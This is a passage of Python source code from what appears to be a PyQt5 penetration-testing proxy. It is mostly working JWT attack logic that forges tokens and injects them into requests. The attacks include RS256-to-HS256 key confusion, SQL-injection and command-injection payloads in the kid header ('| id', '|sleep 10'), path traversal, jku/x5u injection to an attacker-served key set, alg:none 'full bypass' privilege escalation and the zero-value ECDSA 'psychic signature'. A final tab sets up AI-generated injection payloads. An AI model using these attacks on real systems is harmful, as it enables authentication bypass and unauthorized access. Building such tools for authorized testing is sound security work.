            # base64-decode(k) exactly 
            pub_key = extra_params.get('pubkey', '')
            if not pub_key.strip():
                self.status_bar.setText("⚠ RS256→HS256: no public key provided")
                QTimer.singleShot(3000, lambda: self.status_bar.setText("Ready"))
                return
            final_hdr['alg'] = 'HS256'
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            sig = _sign_hs(hb, pb, pub_key.encode('utf-8'))
            new_tok = f"{hb}.{pb}.{sig}"
            self._jwt_req_sig_display.setPlainText(sig)

        # ── kid SQL injection ─────────────────────────────────────────────
        elif attack_name in (
            "kid SQLi (union '1')", "kid SQLi (union secret)",
            "kid SQLi (0x secret-key)", "kid SQLi (char secret)",
        ):
            _kid_map = {
                "kid SQLi (union '1')":     ("x' UNION SELECT '1';--",                         b"1"),
                "kid SQLi (union secret)":  ("' UNION SELECT 'secret'-- -",                     b"secret"),
                "kid SQLi (0x secret-key)": ("' UNION SELECT 0x7365637265742d6b6579-- -",       b"secret-key"),
                "kid SQLi (char secret)":   ("' UNION SELECT CHAR(115,101,99,114,101,116)-- -", b"secret"),
            }
            kid_val, sign_key = _kid_map[attack_name]
            final_hdr['kid'] = kid_val
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            sig = _sign_hs(hb, pb, sign_key)
            new_tok = f"{hb}.{pb}.{sig}"
            self._jwt_req_sig_display.setPlainText(sig)

        elif attack_name == "kid blank (empty secret)":
            final_hdr['kid'] = ''
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            sig = _sign_hs(hb, pb, b'')
            new_tok = f"{hb}.{pb}.{sig}"
            self._jwt_req_sig_display.setPlainText(sig)

        elif attack_name == "kid traversal ../../../../../../dev/null":
            final_hdr['kid'] = '../../../../../../dev/null'
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            sig = _sign_hs(hb, pb, b'')
            new_tok = f"{hb}.{pb}.{sig}"
            self._jwt_req_sig_display.setPlainText(sig)

        # ── kid RCE ───────────────────────────────────────────────────────
        elif attack_name in (
            "kid RCE (sleep 10)", "kid RCE (id)", "kid RCE (whoami)",
        ):
            _rce_kids = {
                "kid RCE (sleep 10)": "|sleep 10",
                "kid RCE (id)":       "| id",
                "kid RCE (whoami)":   "| whoami",
            }
            final_hdr['kid'] = _rce_kids[attack_name]
            final_hdr['alg'] = 'HS256'
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            sig = _sign_hs(hb, pb, b'')
            new_tok = f"{hb}.{pb}.{sig}"
            self._jwt_req_sig_display.setPlainText(sig)

        # ── header injection ──────────────────────────────────────────────
        elif attack_name in ("jku injection", "x5u injection"):
            url = extra_params.get('url', '').strip()
            if not url:
                self.status_bar.setText(f"⚠ {attack_name}: no URL provided")
                QTimer.singleShot(3000, lambda: self.status_bar.setText("Ready"))
                return
            if attack_name == "jku injection":
                final_hdr.pop('x5u', None)
                final_hdr['jku'] = url
            else:
                final_hdr.pop('jku', None)
                final_hdr['x5u'] = url

            # ── Sign with selected Key Manager RSA key (or ephemeral)
            _signed_with_rsa = False
            try:
                from cryptography.hazmat.primitives.asymmetric import rsa as _crsa, padding as _pad
                from cryptography.hazmat.primitives import hashes as _hashes, serialization as _ser
                from cryptography.hazmat.backends import default_backend

                if km_key is not None:
                    # Reconstruct private key from stored JWK
                    priv_jwk = km_key.get('_priv_jwk', {})
                    pem_priv = km_key.get('_pem_priv', '')
                    alg      = km_key.get('alg', 'RS256')
                    kid      = km_key.get('kid') or priv_jwk.get('kid', '')
                    if pem_priv:
                        priv_key = _ser.load_pem_private_key(
                            pem_priv.encode(), password=None, backend=default_backend()
                        )
                    else:
                        def _b2i(s):
                            import base64
                            pad = 4 - len(s) % 4
                            b = base64.urlsafe_b64decode(s + '=' * (pad % 4))
                            return int.from_bytes(b, 'big')
                        from cryptography.hazmat.primitives.asymmetric.rsa import (
                            RSAPrivateNumbers, RSAPublicNumbers
                        )
                        priv_key = RSAPrivateNumbers(
                            _b2i(priv_jwk['p']), _b2i(priv_jwk['q']),
                            _b2i(priv_jwk['d']), _b2i(priv_jwk['dp']),
                            _b2i(priv_jwk['dq']), _b2i(priv_jwk['qi']),
                            RSAPublicNumbers(_b2i(priv_jwk['e']), _b2i(priv_jwk['n']))
                        ).private_key(default_backend())
                else:
                    # Ephemeral key
                    priv_key = _crsa.generate_private_key(65537, 2048, default_backend())
                    alg  = 'RS256'
                    kid  = ''

                _hash_map = {
                    'RS256': _hashes.SHA256(), 'RS384': _hashes.SHA384(), 'RS512': _hashes.SHA512(),
                    'PS256': _hashes.SHA256(), 'PS384': _hashes.SHA384(), 'PS512': _hashes.SHA512(),
                }
                _hash_obj = _hash_map.get(alg, _hashes.SHA256())
                if alg.startswith('PS'):
                    _padding = _pad.PSS(
                        mgf=_pad.MGF1(_hash_map.get(alg, _hashes.SHA256())),
                        salt_length=_pad.PSS.MAX_LENGTH
                    )
                else:
                    _padding = _pad.PKCS1v15()

                final_hdr['alg'] = alg
                if kid:
                    final_hdr['kid'] = kid
                hb = _b64e(final_hdr); pb = _b64e(final_pay)
                sig_bytes = priv_key.sign(f"{hb}.{pb}".encode(), _padding, _hash_obj)
                sig = self._b64url_encode(sig_bytes)
                new_tok = f"{hb}.{pb}.{sig}"
                self._jwt_req_sig_display.setPlainText(sig[:24] + '…')
                _signed_with_rsa = True
                if km_key is not None:
                    self.status_bar.setText(
                        f"✔ {attack_name}: signed {alg} with key '{kid}' — serve JWKS at {url}"
                    )
                    QTimer.singleShot(6000, lambda: self.status_bar.setText("Ready"))
                else:
                    _pn = priv_key.public_key().public_numbers()
                    def _int_b64(n):
                        ln = (n.bit_length() + 7) // 8
                        return self._b64url_encode(n.to_bytes(ln, 'big'))
                    _eph_jwks = json.dumps({"keys": [{"kty": "RSA", "alg": "RS256",
                        "use": "sig", "n": _int_b64(_pn.n), "e": _int_b64(_pn.e)}]}, indent=2)
                    QApplication.clipboard().setText(_eph_jwks)
                    self.status_bar.setText(
                        f"✔ {attack_name}: ephemeral RS256 — JWKS copied to clipboard, serve at {url}"
                    )
                    QTimer.singleShot(6000, lambda: self.status_bar.setText("Ready"))
            except ImportError:
                _signed_with_rsa = False

            if not _signed_with_rsa:
                # Fallback: HS256 with dummy secret
                final_hdr['alg'] = 'HS256'
                hb = _b64e(final_hdr); pb = _b64e(final_pay)
                sig = _sign_hs(hb, pb, b'secret')
                new_tok = f"{hb}.{pb}.{sig}"
                self._jwt_req_sig_display.setPlainText(sig)

            # If the attacker URL is a ngrok tunnel, make sure the bypass header
            # is present so the ngrok browser-warning page doesn't interfere.
            self._ensure_ngrok_header(url)

        elif attack_name == "Embedded JWK (self-signed)":
            try:
                from cryptography.hazmat.primitives.asymmetric import rsa, padding
                from cryptography.hazmat.primitives import hashes
                from cryptography.hazmat.backends import default_backend
                priv = rsa.generate_private_key(65537, 2048, default_backend())
                pn   = priv.public_key().public_numbers()

                def _int_b64(n: int) -> str:
                    ln = (n.bit_length() + 7) // 8
                    return self._b64url_encode(n.to_bytes(ln, 'big'))

                jwk = {"kty": "RSA", "alg": "RS256", "use": "sig",
                       "n": _int_b64(pn.n), "e": _int_b64(pn.e)}
                final_hdr.update({'alg': 'RS256', 'jwk': jwk})
                final_hdr.pop('kid', None); final_hdr.pop('jku', None)
                hb = _b64e(final_hdr); pb = _b64e(final_pay)
                sig_bytes = priv.sign(
                    f"{hb}.{pb}".encode(), padding.PKCS1v15(), hashes.SHA256()
                )
                sig = self._b64url_encode(sig_bytes)
                new_tok = f"{hb}.{pb}.{sig}"
                self._jwt_req_sig_display.setPlainText(sig[:24] + '…')
            except ImportError:
                dummy_jwk = {"kty": "oct", "alg": "HS256",
                             "k": self._b64url_encode(b"attacker-key")}
                final_hdr.update({'alg': 'HS256', 'jwk': dummy_jwk})
                hb = _b64e(final_hdr); pb = _b64e(final_pay)
                sig = _sign_hs(hb, pb, b'attacker-key')
                new_tok = f"{hb}.{pb}.{sig}"
                self._jwt_req_sig_display.setPlainText(sig)

        # ── claim manipulation ────────────────────────────────────────────
        elif attack_name == "Exp extension (+1 year)":
            final_pay['exp'] = int(time.time()) + 86_400 * 365
            if 'nbf' in final_pay:
                final_pay['nbf'] = int(time.time()) - 10
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        elif attack_name == "Null claim: sub=None":
            final_pay['sub'] = None
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        elif attack_name == "Null claim: sub=''":
            final_pay['sub'] = ''
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        elif attack_name == "Null claim: sub='null'":
            final_pay['sub'] = 'null'
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        elif attack_name == "Null claim: sub='*'":
            final_pay['sub'] = '*'
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        # ── privilege escalation ──────────────────────────────────────────
        elif attack_name == "Priv-esc: role=admin, isAdmin=True":
            final_pay.update({"role": "admin", "isAdmin": True})
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        elif attack_name == "Priv-esc: roles=['admin','superadmin'], scope=admin write read":
            final_pay.update({
                "roles": ["admin", "superadmin"],
                "scope": "admin write read",
            })
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        elif attack_name == "Priv-esc: user_type=admin, permissions=[...]":
            final_pay.update({
                "user_type": "admin",
                "permissions": ["read", "write", "delete", "admin"],
            })
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        # ── combined attacks ──────────────────────────────────────────────
        elif attack_name == "alg:none + role=admin, isAdmin=True":
            final_hdr['alg'] = 'none'
            final_pay.update({"role": "admin", "isAdmin": True})
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        elif attack_name == "alg:none + exp+1yr":
            final_hdr['alg'] = 'none'
            final_pay['exp'] = int(time.time()) + 86_400 * 365
            if 'nbf' in final_pay:
                final_pay['nbf'] = int(time.time()) - 10
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        elif attack_name == "FULL BYPASS alg:none (admin+exp+nosig)":
            final_hdr['alg'] = 'none'
            final_pay.update({
                "role":    "admin",
                "isAdmin": True,
                "roles":   ["admin", "superadmin"],
                "scope":   "admin write read delete",
                "exp":     int(time.time()) + 86_400 * 365,
            })
            if 'nbf' in final_pay:
                final_pay['nbf'] = int(time.time()) - 10
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        elif attack_name == "kid SQLi+alg:none (null secret)":
            final_hdr['kid'] = "' UNION SELECT 'secret'-- -"
            final_hdr['alg'] = 'none'
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        # ── CVE: psychic signature ─────────────────────────────────────────
        elif attack_name.startswith("Psychic Sig"):
            alg = ("ES256" if "ES256" in attack_name else
                   "ES384" if "ES384" in attack_name else "ES512")
            final_hdr['alg'] = alg
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}.MAYCAQACAQA"
            self._jwt_req_sig_display.setPlainText("MAYCAQACAQA  [zero-value ECDSA]")

        else:
            self.status_bar.setText(f"⚠ Unknown attack: {attack_name}")
            QTimer.singleShot(3000, lambda: self.status_bar.setText("Ready"))
            return

        # ── Update editors (block signals to avoid live-timer re-fire) ────
        self._jwt_req_hdr_edit.blockSignals(True)
        self._jwt_req_pay_edit.blockSignals(True)
        self._jwt_req_hdr_edit.setPlainText(json.dumps(final_hdr, indent=2))
        self._jwt_req_pay_edit.setPlainText(json.dumps(final_pay, indent=2))
        self._jwt_req_hdr_edit.blockSignals(False)
        self._jwt_req_pay_edit.blockSignals(False)

        # ── Apply to request or copy to clipboard ─────────────────────────
        if new_tok and self._jwt_replace_in_request(new_tok):
            # Sync cached sig so live-apply preserves the attack sig
            if 'req' in self._jwt_state:
                self._jwt_state['req']['raw_sig'] = new_tok.split('.')[-1]
            self.status_bar.setText(f"⚡ Attack applied: {attack_name}")
        elif new_tok:
            QApplication.clipboard().setText(new_tok)
            self.status_bar.setText(
                f"⚡ Token copied to clipboard (original not in request): {attack_name}"
            )
        QTimer.singleShot(4000, lambda: self.status_bar.setText("Ready"))

    def _jwt_resign_and_apply(self) -> None:
        """Sign with user-provided HMAC-SHA256 secret and apply to request."""
        secret_txt = self._jwt_secret_input.text().strip()
        if not secret_txt:
            # Apply without signature
            self._jwt_apply_to_request()
            return
        secret_bytes = secret_txt.encode('utf-8')
        try:
            hdr = json.loads(self._jwt_req_hdr_edit.toPlainText())
            hdr['alg'] = 'HS256'
            self._jwt_req_hdr_edit.setPlainText(json.dumps(hdr, indent=2))
        except Exception:
            pass
        new_tok = self._jwt_build_modified(alg_override='HS256', secret=secret_bytes)
        # Update signature display
        self._jwt_req_sig_display.setPlainText(new_tok.split('.')[-1])
        if self._jwt_replace_in_request(new_tok):
            self.status_bar.setText("✅ JWT re-signed with HS256 and applied to request")
        else:
            QApplication.clipboard().setText(new_tok)
            self.status_bar.setText("✅ Re-signed JWT copied to clipboard")
        QTimer.singleShot(4000, lambda: self.status_bar.setText("Ready"))

    def _jwt_get_km_keys(self) -> list:
        """Return all keys from the JWT tab Key Manager, or [] if unavailable."""
        try:
            from PyQt5.QtWidgets import QApplication as _App
            for _w in _App.instance().topLevelWidgets():
                if hasattr(_w, 'jwt_tab') and hasattr(_w.jwt_tab, '_managed_keys'):
                    return list(_w.jwt_tab._managed_keys)
        except Exception:
            pass
        return []

    def _jwt_show_km_key_menu(self, btn: QPushButton) -> None:
        """Show a popup menu listing all Key Manager keys; signing on selection."""
        keys = self._jwt_get_km_keys()
        menu = QMenu(self)
        menu.setStyleSheet(
            f"QMenu{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};font-size:12px;}}"
            f"QMenu::item{{padding:5px 20px 5px 12px;}}"
            f"QMenu::item:selected{{background:#313244;}}"
            f"QMenu::separator{{height:1px;background:{COLOR_BORDER};margin:3px 0;}}"
        )

        if not keys:
            no_keys = menu.addAction("(No keys in Key Manager — generate one in the JWT tab)")
            no_keys.setEnabled(False)
        else:
            # Group keys by type
            _type_icon = {"Symmetric": "", "RSA": "", "EC": "", "OKP": ""}
            _groups: dict = {}
            for idx, k in enumerate(keys):
                ktype = k.get("_type", "Unknown")
                _groups.setdefault(ktype, []).append((idx, k))

            for ktype, items in _groups.items():
                icon = _type_icon.get(ktype, "")
                sub = menu.addMenu(f"{icon}  {ktype} Keys")
                sub.setStyleSheet(menu.styleSheet())
                for idx, k in items:
                    kid  = k.get("kid", f"key-{idx}")
                    alg  = k.get("alg", k.get("kty", "?"))
                    size = k.get("_size", "")
                    has_priv = bool(k.get("_priv_jwk") or k.get("_pem_priv") not in (None, "", "(not available — public key only)"))
                    label = f"{kid}  [{alg}  {size}]".strip()
                    if not has_priv:
                        label += "  (pub only)"
                    act = sub.addAction(label)
                    act.setEnabled(has_priv)
                    def _make_slot(key_data):
                        return lambda: self._jwt_sign_with_km_key(key_data)
                    act.triggered.connect(_make_slot(k))

        menu.exec_(btn.mapToGlobal(btn.rect().bottomLeft()))

    def _jwt_sign_with_km_key(self, key_data: dict) -> None:
        """
        Sign the current JWT with *key_data* from the Key Manager and apply to request.
        Supports: Symmetric (HS256/384/512), RSA (RS/PS256/384/512), EC (ES256/384/512), OKP (EdDSA).
        """
        try:
            hdr = json.loads(self._jwt_req_hdr_edit.toPlainText() or '{}')
        except Exception:
            hdr = {}
        try:
            pay = json.loads(self._jwt_req_pay_edit.toPlainText() or '{}')
        except Exception:
            pay = {}

        ktype = key_data.get("_type", "")
        alg   = key_data.get("alg", "")
        kid   = key_data.get("kid", "")

        def _b64e(d: dict) -> str:
            return self._b64url_encode(json.dumps(d, separators=(',', ':')).encode())

        new_tok: Optional[str] = None

        try:
            # ── Symmetric (HS256 / HS384 / HS512) ────────────────────────
            if ktype == "Symmetric":
                import base64 as _b64
                # Prefer _priv_jwk['k'] — it reflects the last user edit in the
                # preview dialog.  Fall back to top-level 'k' for keys that were
                # never edited through the preview JWK editor.
                k_b64 = (key_data.get("_priv_jwk") or {}).get("k") or key_data.get("k", "")
                if not k_b64:
                    raise ValueError("Symmetric key has no 'k' field")
                # Normalise: accept both standard base64 (+/) and base64url (-_)
                # so users can paste the k_val from the Algorithm Confusion dialog
                # directly without converting characters.
                k_normalised = k_b64.replace("+", "-").replace("/", "_").rstrip("=")
                raw_secret = _b64.urlsafe_b64decode(k_normalised + "=" * (-len(k_normalised) % 4))
                _hash_for = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
                _hfn = _hash_for.get(alg, hashlib.sha256)
                # Only update alg — preserve the original kid so the server
                # can still look up its key by kid.
                hdr["alg"] = alg
                self._jwt_req_hdr_edit.blockSignals(True)
                self._jwt_req_hdr_edit.setPlainText(json.dumps(hdr, indent=2))
                self._jwt_req_hdr_edit.blockSignals(False)
                hb = _b64e(hdr); pb = _b64e(pay)
                sig_bytes = hmac.new(raw_secret, f"{hb}.{pb}".encode(), _hfn).digest()
                sig = self._b64url_encode(sig_bytes)
                new_tok = f"{hb}.{pb}.{sig}"
                self._jwt_req_sig_display.setPlainText(sig[:32] + "…" if len(sig) > 32 else sig)

            # ── RSA (RS256/RS384/RS512/PS256/PS384/PS512) ─────────────────
            elif ktype == "RSA":
                from cryptography.hazmat.primitives import serialization as _ser, hashes as _hashes
                from cryptography.hazmat.primitives.asymmetric import padding as _pad
                from cryptography.hazmat.backends import default_backend

                pem_priv = key_data.get("_pem_priv", "")
                if not pem_priv or pem_priv.startswith("("):
                    raise ValueError("RSA key has no stored private key PEM")
                priv_key = _ser.load_pem_private_key(pem_priv.encode(), password=None, backend=default_backend())

                _hash_map = {
                    "RS256": _hashes.SHA256(), "RS384": _hashes.SHA384(), "RS512": _hashes.SHA512(),
                    "PS256": _hashes.SHA256(), "PS384": _hashes.SHA384(), "PS512": _hashes.SHA512(),
                }
                _hash_obj = _hash_map.get(alg, _hashes.SHA256())
                if alg.startswith("PS"):
                    _padding = _pad.PSS(
                        mgf=_pad.MGF1(_hash_map.get(alg, _hashes.SHA256())),
                        salt_length=_pad.PSS.MAX_LENGTH,
                    )
                else:
                    _padding = _pad.PKCS1v15()

                hdr["alg"] = alg
                self._jwt_req_hdr_edit.blockSignals(True)
                self._jwt_req_hdr_edit.setPlainText(json.dumps(hdr, indent=2))
                self._jwt_req_hdr_edit.blockSignals(False)
                hb = _b64e(hdr); pb = _b64e(pay)
                sig_bytes = priv_key.sign(f"{hb}.{pb}".encode(), _padding, _hash_obj)
                sig = self._b64url_encode(sig_bytes)
                new_tok = f"{hb}.{pb}.{sig}"
                self._jwt_req_sig_display.setPlainText(sig[:24] + "…")

            # ── EC (ES256 / ES384 / ES512) ────────────────────────────────
            elif ktype == "EC":
                from cryptography.hazmat.primitives import serialization as _ser, hashes as _hashes
                from cryptography.hazmat.primitives.asymmetric import ec as _ec
                from cryptography.hazmat.backends import default_backend
                from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

                pem_priv = key_data.get("_pem_priv", "")
                if not pem_priv or pem_priv.startswith("("):
                    raise ValueError("EC key has no stored private key PEM")
                priv_key = _ser.load_pem_private_key(pem_priv.encode(), password=None, backend=default_backend())

                crv = key_data.get("crv", "P-256")
                _coord_len = {"P-256": 32, "P-384": 48, "P-521": 66}.get(crv, 32)
                _hash_map = {"ES256": _hashes.SHA256(), "ES384": _hashes.SHA384(), "ES512": _hashes.SHA512()}
                _hash_obj = _hash_map.get(alg, _hashes.SHA256())

                hdr["alg"] = alg
                self._jwt_req_hdr_edit.blockSignals(True)
                self._jwt_req_hdr_edit.setPlainText(json.dumps(hdr, indent=2))
                self._jwt_req_hdr_edit.blockSignals(False)
                hb = _b64e(hdr); pb = _b64e(pay)
                # EC sign returns DER-encoded ASN.1 signature; JWT needs raw r||s
                der_sig = priv_key.sign(f"{hb}.{pb}".encode(), _ec.ECDSA(_hash_obj))
                r, s = decode_dss_signature(der_sig)
                sig = self._b64url_encode(
                    r.to_bytes(_coord_len, "big") + s.to_bytes(_coord_len, "big")
                )
                new_tok = f"{hb}.{pb}.{sig}"
                self._jwt_req_sig_display.setPlainText(sig[:24] + "…")

            # ── OKP (EdDSA) ───────────────────────────────────────────────
            elif ktype == "OKP":
                from cryptography.hazmat.primitives import serialization as _ser
                from cryptography.hazmat.backends import default_backend

                pem_priv = key_data.get("_pem_priv", "")
                if not pem_priv or pem_priv.startswith("("):
                    raise ValueError("OKP key has no stored private key PEM")
                priv_key = _ser.load_pem_private_key(pem_priv.encode(), password=None, backend=default_backend())

                hdr["alg"] = "EdDSA"
                self._jwt_req_hdr_edit.blockSignals(True)
                self._jwt_req_hdr_edit.setPlainText(json.dumps(hdr, indent=2))
                self._jwt_req_hdr_edit.blockSignals(False)
                hb = _b64e(hdr); pb = _b64e(pay)
                sig_bytes = priv_key.sign(f"{hb}.{pb}".encode())
                sig = self._b64url_encode(sig_bytes)
                new_tok = f"{hb}.{pb}.{sig}"
                self._jwt_req_sig_display.setPlainText(sig[:24] + "…")

            else:
                raise ValueError(f"Unsupported key type: {ktype!r}")

        except ImportError:
            QMessageBox.warning(
                self, "Missing Dependency",
                "Signing with asymmetric keys requires the 'cryptography' package.\n"
                "Install with:  pip install cryptography"
            )
            return
        except Exception as exc:
            QMessageBox.warning(self, "Signing Failed", str(exc))
            return

        if new_tok:
            if self._jwt_replace_in_request(new_tok):
                if "req" in self._jwt_state:
                    self._jwt_state["req"]["raw_sig"] = new_tok.split(".")[-1]
                self.status_bar.setText(
                    f" JWT signed with {ktype} key '{kid}' ({alg}) and applied to request"
                )
            else:
                QApplication.clipboard().setText(new_tok)
                self.status_bar.setText(
                    f" JWT signed with {ktype} key '{kid}' ({alg}) — copied to clipboard"
                )
            QTimer.singleShot(5000, lambda: self.status_bar.setText("Ready"))



    def _jwt_apply_to_request(self) -> None:
        """Build JWT with current edits (no signature) and replace in request."""
        new_tok = self._jwt_build_modified(secret=None)
        self._jwt_req_sig_display.setPlainText('(unsigned)')
        if self._jwt_replace_in_request(new_tok):
            self.status_bar.setText("📝 Modified JWT (no sig) applied to request")
        else:
            QApplication.clipboard().setText(new_tok)
            self.status_bar.setText("📝 Modified JWT copied to clipboard (original not found)")
        QTimer.singleShot(3000, lambda: self.status_bar.setText("Ready"))

    def _jwt_copy_original(self) -> None:
        token = self._jwt_state.get('req', {}).get('token', '')
        if token:
            QApplication.clipboard().setText(token)
            self.status_bar.setText("📋 Original JWT copied to clipboard")
            QTimer.singleShot(2000, lambda: self.status_bar.setText("Ready"))

    def _jwt_remove_signature(self) -> None:
        """Strip signature from the current token — keeps header+payload, sets sig to empty."""
        try:
            hdr_json = json.loads(self._jwt_req_hdr_edit.toPlainText() or '{}')
        except Exception:
            hdr_json = {}
        try:
            pay_json = json.loads(self._jwt_req_pay_edit.toPlainText() or '{}')
        except Exception:
            pay_json = {}
        hdr_b64 = self._b64url_encode(json.dumps(hdr_json, separators=(',', ':')).encode())
        pay_b64 = self._b64url_encode(json.dumps(pay_json, separators=(',', ':')).encode())
        new_tok = f"{hdr_b64}.{pay_b64}."
        self._jwt_req_sig_display.blockSignals(True)
        self._jwt_req_sig_display.setPlainText('(unsigned)')
        self._jwt_req_sig_display.blockSignals(False)
        # Also update the cached orig sig so live-apply won't restore it
        if 'req' in self._jwt_state:
            self._jwt_state['req']['raw_sig'] = ''
        if self._jwt_replace_in_request(new_tok):
            self.status_bar.setText("🗑 Signature removed from token")
        else:
            QApplication.clipboard().setText(new_tok)
            self.status_bar.setText("🗑 Unsigned token copied to clipboard (original not found)")
        QTimer.singleShot(3000, lambda: self.status_bar.setText("Ready"))

    def _jwt_copy_modified(self) -> None:
        new_tok = self._jwt_build_modified(secret=None)
        QApplication.clipboard().setText(new_tok)
        self.status_bar.setText("📋 Modified JWT (no sig) copied to clipboard")
        QTimer.singleShot(2000, lambda: self.status_bar.setText("Ready"))

    def _jwt_resp_use_in_request(self) -> None:
        """Take the JWT from the response panel and put it in the request editor."""
        token = self._jwt_state.get('resp', {}).get('token', '')
        if not token:
            return
        raw = self.request_editor.toPlainText()
        # Try to replace existing Authorization header
        if re.search(r'^[Aa]uthorization:\s*', raw, re.MULTILINE):
            new_raw = re.sub(
                r'^([Aa]uthorization:\s*).*$',
                f'Authorization: Bearer {token}',
                raw, count=1, flags=re.MULTILINE
            )
        else:
            # Insert after first line
            lines = raw.splitlines(keepends=True)
            new_raw = lines[0] + f'Authorization: Bearer {token}\n' + ''.join(lines[1:]) if lines else raw
        self.request_editor.setPlainText(new_raw)
        # Switch back to raw view if needed
        if self._jwt_resp_mode:
            self._jwt_resp_mode = False
            self.resp_jwt_btn.setChecked(False)
            self.resp_jwt_btn.setText(" JWT")
            self.resp_stack.setCurrentIndex(0)
        self.status_bar.setText("✅ JWT added to Authorization header in request")
        QTimer.singleShot(3000, lambda: self.status_bar.setText("Ready"))

    # ── AI Payload Suggester ──────────────────────────────────────────────────

    _AI_SCAN_TYPES = ["XSS", "SQLi", "LFI", "XXE", "SSRF", "Open Redirect",
                      "Command Injection", "SSTI", "NoSQLi", "IDOR"]

    def _build_ai_payloads_tab(self) -> QWidget:
        """Build and return the ' AI Payloads' tab widget."""
        _purple   = "#b48eff"
        _purple_d = "#7c5cbf"
        _bg       = COLOR_DARK_BG
        _el       = COLOR_ELEVATED_BG

        container = QWidget()
        vlay = QVBoxLayout(container)
        vlay.setContentsMargins(6, 6, 6, 6)
        vlay.setSpacing(4)

        # ── Controls row ──────────────────────────────────────────────────
        ctrl_row = QHBoxLayout()
        ctrl_row.setSpacing(6)

        ctrl_row.addWidget(QLabel("Type:"))
        self._ai_scan_type_combo = QComboBox()
        self._ai_scan_type_combo.addItems(self._AI_SCAN_TYPES)
        self._ai_scan_type_combo.setFixedWidth(130)
        self._ai_scan_type_combo.setStyleSheet(
            f"background:{_bg};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};"
            f"border-radius:4px;padding:2px 6px;"
        )
        ctrl_row.addWidget(self._ai_scan_type_combo)

        ctrl_row.addWidget(QLabel("Param:"))
        self._ai_param_input = QLineEdit()
        self._ai_param_input.setPlaceholderText("name or select text in request…")
        self._ai_param_input.setFixedWidth(180)
        self._ai_param_input.setStyleSheet(
            f"background:{_bg};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};"
            f"border-radius:4px;padding:2px 6px;"
        )
        ctrl_row.addWidget(self._ai_param_input)

        detect_btn = QPushButton("⟳ Auto-detect")
        detect_btn.setFixedHeight(24)
        detect_btn.setToolTip("Auto-detect the first parameter from the request")
        detect_btn.setStyleSheet(
            f"background:{_el};color:{_purple};border:1px solid {_purple_d};"
            f"border-radius:3px;font-size:11px;padding:0 8px;"
        )
        detect_btn.clicked.connect(self._ai_auto_detect_param)
        ctrl_row.addWidget(detect_btn)

        ctrl_row.addStretch()

        self._ai_generate_btn = QPushButton(" Generate Payloads")
        self._ai_generate_btn.setFixedHeight(24)
        self._ai_generate_btn.setStyleSheet(
            f"QPushButton{{background:{_purple_d};color:#fff;border:none;"
            f"border-radius:4px;font-weight:700;font-size:12px;padding:0 14px;}}"
            f"QPushButton:hover{{background:{_purple};}}"
            f"QPushButton:disabled{{background:#444;color:#888;}}"
        )
        self._ai_generate_btn.clicked.connect(self._on_ai_payloads_generate)
        ctrl_row.addWidget(self._ai_generate_btn)

        vlay.addLayout(ctrl_row)

        # ── WAF hint row ──────────────────────────────────────────────────
        waf_row = QHBoxLayout()
        waf_row.setSpacing(6)
        waf_row.addWidget(QLabel("WAF/Filter hint:"))
        self._ai_waf_input = QLineEdit()
        self._ai_waf_input.setPlaceholderText("auto-detected from response, or type manually…")
        self._ai_waf_input.setStyleSheet(
            f"background:{_bg};color:{COLOR_TEXT_MUTED};border:1px solid {COLOR_BORDER};"
            f"border-radius:4px;padding:2px 6px;font-size:11px;"
        )
        waf_row.addWidget(self._ai_waf_input)
        vlay.addLayout(waf_row)

        # ── Status label ──────────────────────────────────────────────────
        self._ai_status_lbl = QLabel("Select an injection value in the request editor, then click Generate.")
        self._ai_status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;padding:2px 0;")
        self._ai_status_lbl.setWordWrap(True)
        vlay.addWidget(self._ai_status_lbl)

        # ── Payload table ─────────────────────────────────────────────────
        self._ai_payload_table = QTableWidget(0, 5)
        self._ai_payload_table.setHorizontalHeaderLabels(
            ["#", "Payload", "Status", "Length", "Actions"]
        )
        self._ai_payload_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self._ai_payload_table.horizontalHeader().setSectionResizeMode(4, QHeaderView.Fixed)
        self._ai_payload_table.setColumnWidth(0, 30)
        self._ai_payload_table.setColumnWidth(2, 55)
